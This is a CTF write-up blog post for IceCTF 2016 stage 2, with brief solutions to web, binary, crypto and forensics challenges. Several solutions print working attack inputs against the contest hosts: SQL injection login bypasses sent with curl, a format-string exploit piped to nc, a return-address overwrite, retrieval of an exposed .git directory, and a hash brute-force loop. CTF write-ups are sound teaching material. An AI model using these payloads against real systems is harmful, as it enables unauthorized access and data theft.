---
layout: post
redirect_from:
  - /blog/2016/08/27/icectf-2016-stage2/
date: "2016-08-27T01:22:14+09:00"
tags: [ "ctf", "writeup", "icectf" ]
"target_url": [ "https://icec.tf/" ]
---

# IceCTF 2016: stage2

## Complacent

<small>
Solved by [@tukejonny](https://twitter.com/tukejonny).
</small>

The SSL certificate has the flag.

``` sh
$ curl -kv https://complacent.vuln.icec.tf/
*   Trying 104.154.248.13...
* Connected to complacent.vuln.icec.tf (104.154.248.13) port 443 (#0)
* found 173 certificates in /etc/ssl/certs/ca-certificates.crt
* found 697 certificates in /etc/ssl/certs
* ALPN, offering http/1.1
* SSL connection using TLS1.2 / ECDHE_RSA_AES_128_GCM_SHA256
* 	 server certificate verification SKIPPED
* 	 server certificate status verification SKIPPED
* 	 common name: complacent.icec.tf (does not match 'complacent.vuln.icec.tf')
* 	 server certificate expiration date OK
* 	 server certificate activation date OK
* 	 certificate public key: RSA
* 	 certificate version: #3
* 	 subject: C=IS,ST=Kingdom of IceCTF,L=IceCTF city,O=Secret IceCTF Buisness Corp,OU=Flag: IceCTF{this_1nformation_wasnt_h1dd3n_at_a11},CN=complacent.icec.tf
* 	 start date: Tue, 02 Aug 2016 19:59:11 GMT
* 	 expire date: Thu, 09 Jul 2116 19:59:11 GMT
* 	 issuer: C=IS,ST=Kingdom of IceCTF,L=IceCTF city,O=Secret IceCTF Buisness Corp,OU=Flag: IceCTF{this_1nformation_wasnt_h1dd3n_at_a11},CN=complacent.icec.tf
* 	 compression: NULL
* ALPN, server did not agree to a protocol
> GET / HTTP/1.1
> Host: complacent.vuln.icec.tf
> User-Agent: curl/7.47.0
> Accept: */*
> 
...
```

## Search

<small>
Solved by [@tukejonny](https://twitter.com/tukejonny).
</small>

See the TXT record of DNS.

``` sh
$ host -t txt search.icec.tf
search.icec.tf descriptive text "IceCTF{flag5_all_0v3r_the_Plac3}"
```

## Hidden in Plain Sight

The flag is written on the `.text`.

```
$ xxd plain_sight | grep 00000510 -A 4
00000510: ec0c 50e8 38fe ffff 83c4 10b0 49b0 63b0  ..P.8.......I.c.
00000520: 65b0 43b0 54b0 46b0 7bb0 6cb0 6fb0 6fb0  e.C.T.F.{.l.o.o.
00000530: 6bb0 5fb0 6db0 6fb0 6db0 5fb0 49b0 5fb0  k._.m.o.m._.I._.
00000540: 66b0 6fb0 75b0 6eb0 64b0 5fb0 69b0 74b0  f.o.u.n.d._.i.t.
00000550: 7dc7 45f4 0000 0000 eb2f 83ec 0c6a 01e8  }.E....../...j..
```

## Toke

After logging in, the `jwt_token` cookie is given.

[RFC 7519](https://tools.ietf.org/html/rfc7519) says that:

>   JSON Web Token (JWT) is a compact, URL-safe means of representing claims to be transferred between two parties.

You can decode this in some sites like <http://jwt.calebb.net/>, and get the flag.

```
Set-Cookie: jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiSWNlQ1RGe2pXN190MEszbnNfNFJlX25PX3AxNENFX2ZPUl81M0NyRTdTfSIsInVzZXIiOiJob2dlIn0.aTmWNl_wEnIBZSOsYLn1X8NsDXI2Yr2A3LwFN_o_YzE; Path=/
```

``` javascript
payload:
{
      "flag": "IceCTF{jW7_t0K3ns_4Re_nO_p14CE_fOR_53CrE7S}",
      "user": "hoge"
}
```

## Flag Storage

On your browser, since the username and passowrd are sent after base64, but you can use `curl` to send SQLi directly.

``` sh
$ curl http://flagstorage.vuln.icec.tf/login.php -F username="' or 1 = 1 -- " -F passowrd=password
...
<h1>Logged in!</h1><p>Your flag is: IceCTF{why_would_you_even_do_anything_client_side}</p>
...
```

## RSA?

It is a trivial RSA.
Due to $e = 1$, $c = m^e = m \pmod{n}$. i.e. the ciphertext $c$ is same to the plaintext $m$.

``` python
#!/usr/bin/env python3
n = 0x180be86dc898a3c3a710e52b31de460f8f350610bf63e6b2203c08fddad44601d96eb454a34dab7684589bc32b19eb27cffff8c07179e349ddb62898ae896f8c681796052ae1598bd41f35491175c9b60ae2260d0d4ebac05b4b6f2677a7609c2fe6194fe7b63841cec632e3a2f55d0cb09df08eacea34394ad473577dea5131552b0b30efac31c59087bfe603d2b13bed7d14967bfd489157aa01b14b4e1bd08d9b92ec0c319aeb8fedd535c56770aac95247d116d59cae2f99c3b51f43093fd39c10f93830c1ece75ee37e5fcdc5b174052eccadcadeda2f1b3a4a87184041d5c1a6a0b2eeaa3c3a1227bc27e130e67ac397b375ffe7c873e9b1c649812edcd
e = 0x1
c = 0x4963654354467b66616c6c735f61706172745f736f5f656173696c795f616e645f7265617373656d626c65645f736f5f63727564656c797d
del n, e
import binascii
print(binascii.unhexlify(hex(c)[2:]).decode())
```


## Demo

Only set the envvar.

``` sh
[ctf-83264@icectf-shell-2016 /home/demo]$ env _=icesh ./demo
$ ls
Makefile  demo  demo.c  flag.txt
$ cat flag.txt
IceCTF{wH0_WoU1d_3vr_7Ru5t_4rgV}
```

## Thor's a hacker now

Use `xxd` and `lzip`.

``` sh
$ xxd -r thor.txt > thor.lz
$ lzip -dkc thor.lz > thor.jpg
$ open thor.jpg
```

`IceCTF{h3XduMp1N9_l1K3_A_r341_B14Ckh47}`

## Dear diary

Do format string attack.
The binary loads the flag into the static area at the head of `main`. You can read this with `%s`.

``` sh
$ echo $'1\n\xa0\xa0\x04\x08%18$s\n2\n3\n' | nc diary.vuln.icec.tf 6501
```

`IceCTF{this_thing_is_just_sitting_here}`

## Exposed

<http://exposed.vuln.icec.tf/.git> can be seen partially.
You cannot `wget -r` directly, but you can download each file: `.git/index`, `.git/HEAD` and `.git/objects/??/??????????????????????????????????????`.

At first, `.git/HEAD` says:

``` sh
$ curl http://exposed.vuln.icec.tf/.git/HEAD
ref: refs/heads/master
```

Then,

``` sh
$ curl http://exposed.vuln.icec.tf/.git/refs/heads/master
1746e11be489319bd8900318874b68304eb05288
```

So,

``` sh
$ curl -s http://exposed.vuln.icec.tf/.git/objects/17/46e11be489319bd8900318874b68304eb05288 | zlib-flate -uncompress
commit 222tree c2b90d32f2ab26ae53144285b05f5020fa320d9b
parent 6034c348380c9709715e6af60d04f684867d7234
author John C. Trevor Fields <john@icec.tf> 1470865669 +0000
committer IceCTF <icectf@icec.tf> 1470953038 +0000

add robots.txt
```

Next, parent: `6034c348380c9709715e6af60d04f684867d7234` or commit:

```
$ curl -s http://exposed.vuln.icec.tf/.git/objects/c2/b90d32f2ab26ae53144285b05f5020fa320d9b | zlib-flate -uncompress | xxd
00000000: 7472 6565 2031 3439 0031 3030 3634 3420  tree 149.100644 
00000010: 2e67 6974 6967 6e6f 7265 0037 a843 79d9  .gitignore.7.Cy.
00000020: 2d21 3df0 f3e6 6964 0ed6 8b9e ddea 7d31  -!=...id......}1
00000030: 3030 3634 3420 666c 6167 2e70 6870 0027  00644 flag.php.'
00000040: 0e02 02d7 ef76 fdaf ceee eb10 b10d d762  .....v.........b
00000050: cd00 3b31 3030 3634 3420 696e 6465 782e  ..;100644 index.
00000060: 7068 7000 8aa1 ee18 c010 18ed 1c8b b3f3  php.............
00000070: a437 ccb9 f84a 66ab 3130 3036 3434 2072  .7...Jf.100644 r
00000080: 6f62 6f74 732e 7478 7400 20c7 74a5 17f7  obots.txt. .t...
00000090: ee2d 7437 9ca2 3d80 c200 e887 eac3       .-t7..=.......
```

Therefore the files are:

-   `.gitignore`: `37a84379d92d213df0f3e669640ed68b9eddea7d`
-   `flag.php`:   `270e0202d7ef76fdafceeeeb10b10dd762cd003b`
-   `index.php`:  `8aa1ee18c01018ed1c8bb3f3a437ccb9f84a66ab`
-   `robots.txt`: `20c774a517f7ee2d74379ca23d80c200e887eac3`

Recursively doing this, you can get the flag: `IceCTF{secure_y0ur_g1t_repos_pe0ple}`.


## IRC II

Log in the `glitch.is:6667` server and use features of the `IceBot`.
It has `flag` command, but you cannot use this simply.

```
/msg IceBot !flag
13:00   hoge    !flag
13:00   IceBot  KeyError: Identifier('hoge') (file "/usr/local/lib/python2.7/dist-packages/sopel/module.py", line 321, in guarded)
```

Read the specified code <https://github.com/sopel-irc/sopel/blob/master/sopel/module.py#L321>, it seems to require a privilege.
So I tried to become a room admin. This is done by making a new room.

```
/join fuga
/invite IceBot
!flag
14:00   hoge    !flag
14:00   IceBot  IceCTF{H3Re_y0U_9O_M4s7Er_m4kE_5uR3_yOU_K33P_iT_54F3}
```

## RSA

The private key info is given. Only compute $m = c^d \pmod{n}$.

``` python
#!/usr/bin/env python3
n = 0x1564aade6f1b9f169dcc94c9787411984cd3878bcd6236c5ce00b4aad6ca7cb0ca8a0334d9fe0726f8b057c4412cfbff75967a91a370a1c1bd185212d46b581676cf750c05bbd349d3586e78b33477a9254f6155576573911d2356931b98fe4fec387da3e9680053e95a4709934289dc0bc5cdc2aa97ce62a6ca6ba25fca6ae38c0b9b55c16be0982b596ef929b7c71da3783c1f20557e4803de7d2a91b5a6e85df64249f48b4cf32aec01c12d3e88e014579982ecd046042af370045f09678c9029f8fc38ebaea564c29115e19c7030f245ebb2130cbf9dc1c340e2cf17a625376ca52ad8163cfb2e33b6ecaf55353bc1ff19f8f4dc7551dc5ba36235af9758b
e = 0x10001
phi = 0x1564aade6f1b9f169dcc94c9787411984cd3878bcd6236c5ce00b4aad6ca7cb0ca8a0334d9fe0726f8b057c4412cfbff75967a91a370a1c1bd185212d46b581676cf750c05bbd349d3586e78b33477a9254f6155576573911d2356931b98fe4fec387da3e9680053e95a4709934289dc0bc5cdc2aa97ce62a6ca6ba25fca6ae366e86eed95d330ffad22705d24e20f9806ce501dda9768d860c8da465370fc70757227e729b9171b9402ead8275bf55d42000d51e16133fec3ba7393b1ced5024ab3e86b79b95ad061828861ebb71d35309559a179c6be8697f8a4f314c9e94c37cbbb46cef5879131958333897532fea4c4ecd24234d4260f54c4e37cb2db1a0
d = 0x12314d6d6327261ee18a7c6ce8562c304c05069bc8c8e0b34e0023a3b48cf5849278d3493aa86004b02fa6336b098a3330180b9b9655cdf927896b22402a18fae186828efac14368e0a5af2c4d992cb956d52e7c9899d9b16a0a07318aa28c8202ebf74c50ccf49a6733327dde111393611f915f1e1b82933a2ba164aff93ef4ab2ab64aacc2b0447d437032858f089bcc0ddeebc45c45f8dc357209a423cd49055752bfae278c93134777d6e181be22d4619ef226abb6bfcc4adec696cac131f5bd10c574fa3f543dd7f78aee1d0665992f28cdbcf55a48b32beb7a1c0fa8a9fc38f0c5c271e21b83031653d96d25348f8237b28642ceb69f0b0374413308481
c = 0x126c24e146ae36d203bef21fcd88fdeefff50375434f64052c5473ed2d5d2e7ac376707d76601840c6aa9af27df6845733b9e53982a8f8119c455c9c3d5df1488721194a8392b8a97ce6e783e4ca3b715918041465bb2132a1d22f5ae29dd2526093aa505fcb689d8df5780fa1748ea4d632caed82ca923758eb60c3947d2261c17f3a19d276c2054b6bf87dcd0c46acf79bff2947e1294a6131a7d8c786bed4a1c0b92a4dd457e54df577fb625ee394ea92b992a2c22e3603bf4568b53cceb451e5daca52c4e7bea7f20dd9075ccfd0af97f931c0703ba8d1a7e00bb010437bb4397ae802750875ae19297a7d8e1a0a367a2d6d9dd03a47d404b36d7defe8469
del e, phi
m = pow(c, d, n)
import binascii
print(binascii.unhexlify(hex(m)[2:]).decode())
```

## Smashing Profit!

Send the addresses of the `flag` function and rewrite the return address.

``` sh
$ readelf -s profit | grep flag
    72: 0804850b    83 FUNC    GLOBAL DEFAULT   13 flag
$ perl -e 'print "\x0b\x85\x04\x08" x 24' | ./profit
```

## Miners!

The source code is given as `login.phps`.
It requires that the number of hit rows is just $1$.
So we don't need to know any `username` and `password`, and `union` shows the flag.

``` sh
$ curl -s http://miners.vuln.icec.tf/login.php -F username="' union select 1,2,3 -- " -F password=foo
<h1>Logged in!</h1><p>Your flag is: IceCTF{the_miners_union_is_a_strong_one}</p>
```


## Over the Hill

Decrypt as Hill cipher.
I couldn't find any good decrypter for this problem, so I write it: <https://github.com/kmyk/hill-cipher-implementation>.

``` python
$ python
>>> alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_{}"
>>> matrix = [[54, 53, 28, 20, 54, 15, 12,  7],
...           [32, 14, 24,  5, 63, 12, 50, 52],
...           [63, 59, 40, 18, 55, 33, 17,  3],
...           [63, 34,  5,  4, 56, 10, 53, 16],
...           [35, 43, 45, 53, 12, 42, 35, 37],
...           [20, 59, 42, 10, 46, 56, 12, 61],
...           [26, 39, 27, 59, 44, 54, 23, 56],
...           [32, 31, 56, 47, 31,  2, 29, 41]]
>>> ''.join([alphabet[i] for i in sum(matrix, [])])
32Cu3pmhGoyf}mY1}8Os4Hrd}Ife5k2qJRT2mQJLu8QkU5m_ANB8S3x5GF5VFcDP
$ ./hill.py -a 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_{}' -k '32Cu3pmhGoyf}mY1}8Os4Hrd}Ife5k2qJRT2mQJLu8QkU5m_ANB8S3x5GF5VFcDP' decrypt '7Nv7}dI9hD9qGmP}CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQ'
IceCTF{linear_algebra_plus_led_zeppelin_are_a_beautiful_m1xture}
```

## Kitty

The hash value whose length is 64 is given.
The login form is like below, so it seems the password matchs `[A-Z][a-z][0-9][0-9][\?%$@#\^\*\(\)\[\];:]`.

``` html
        <form method="post" action="login.php">
            <label for="username">Username: </label>
            <input class="u-full-width" type="text" name="username" placeholder="Username" required minlength="5" />
            <label for="password">Password: </label>
            <input id="password" class="u-full-width" type="password" name="password" placeholder="Password" required pattern="[A-Z][a-z][0-9][0-9][\?%$@#\^\*\(\)\[\];:]" />
            <input type="submit" value="Log In" />
        </form>
```

So I wrote a very simple script, and wait for a while.

``` sh
for a in {A..Z} ; do
    for d in {a..z} ; do
        for m in {0..9} ; do
            for i in {0..9} ; do
                for n in \? \% \$ \@ \# \^ \* \( \) \[ \] \; \: ; do
                    if diff <(echo -n $a$d$m$i$n | sha256sum | grep -o '\w*') <(echo c7e83c01ed3ef54812673569b2d79c4e1f6554ffeb27706e98c067de9ab12d1a) >/dev/null ; then
                        echo $a$d$m$i$n
                    fi
                done
            done
        done
    done
done
```

shows `Vo83*`, `IceCTF{i_guess_hashing_isnt_everything_in_this_world}`.
